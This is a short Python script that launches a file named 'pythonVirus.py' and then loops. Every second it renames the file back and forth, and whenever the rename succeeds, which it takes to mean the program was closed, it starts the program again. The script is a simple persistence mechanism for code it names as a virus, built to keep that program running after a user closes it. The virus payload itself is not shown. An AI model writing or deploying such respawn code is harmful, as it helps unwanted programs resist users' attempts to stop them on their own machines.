import os
import time
os.system("start pythonVirus.py /k")
while True:
    try: 
        time.sleep(1)
        os.rename('pythonVirus.py', 'pythonTemp.py')
        os.rename('pythonTemp.py', 'pythonVirus.py')
        closed = 1
    except OSError as e:
        closed = e
    print(closed)
    if closed == 1:
        os.system("start pythonVirus.py /k")